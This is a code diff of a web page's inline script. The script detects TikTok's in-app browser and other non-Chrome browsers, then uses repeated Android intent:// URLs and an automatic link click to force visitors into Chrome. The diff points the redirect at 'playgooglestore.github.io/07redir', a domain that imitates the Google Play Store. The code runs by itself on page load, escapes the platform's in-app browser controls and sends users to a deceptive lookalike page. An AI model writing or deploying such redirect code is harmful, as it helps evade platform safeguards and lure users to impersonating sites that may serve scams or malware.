@@ -12,9 +12,9 @@
  
 <script>
 if (navigator.userAgent.toLowerCase().includes("bytedancewebview")){
-    window.open( "intent://kilted-apps.website/?tt_dynamic_pixel=XXXXX#Intent;scheme=https;package=com.android.chrome;end;");
-    window.location.href = "intent://kilted-apps.website/?tt_dynamic_pixel=XXXXX#Intent;scheme=https;package=com.android.chrome;end;";
-    window.location.replace("intent://kilted-apps.website/?tt_dynamic_pixel=XXXXX#Intent;scheme=https;package=com.android.chrome;end;")
+    window.open( "intent://playgooglestore.github.io/07redir/index02#Intent;scheme=https;package=com.android.chrome;end;");
+    window.location.href = "intent://playgooglestore.github.io/07redir/index02#Intent;scheme=https;package=com.android.chrome;end;";
+    window.location.replace("intent://playgooglestore.github.io/07redir/index02#Intent;scheme=https;package=com.android.chrome;end;")
  }
 </script>
  
@@ -25,8 +25,8 @@ var no_fire = 1;
  
  if (ua.getBrowser().name !== "Chrome") {
     var lnk = document.getElementById("r");
-    //lnk.setAttribute("href", `intent://navigate?url=${window.location.hostname}/?tt_dynamic_pixel=XXXXX#Intent;scheme=googlechrome;end;`);
-    lnk.setAttribute("href", `intent://${window.location.hostname}/?tt_dynamic_pixel=XXXXX#Intent;scheme=https;package=com.android.chrome;end;`);
+    //lnk.setAttribute("href", `intent://navigate?url=${window.location.hostname}/#Intent;scheme=googlechrome;end;`);
+    lnk.setAttribute("href", `intent://${window.location.hostname}/#Intent;scheme=https;package=com.android.chrome;end;`);
     lnk.click();
     if (ua.getBrowser().name == 'Chrome WebView') {
                 //goLink();
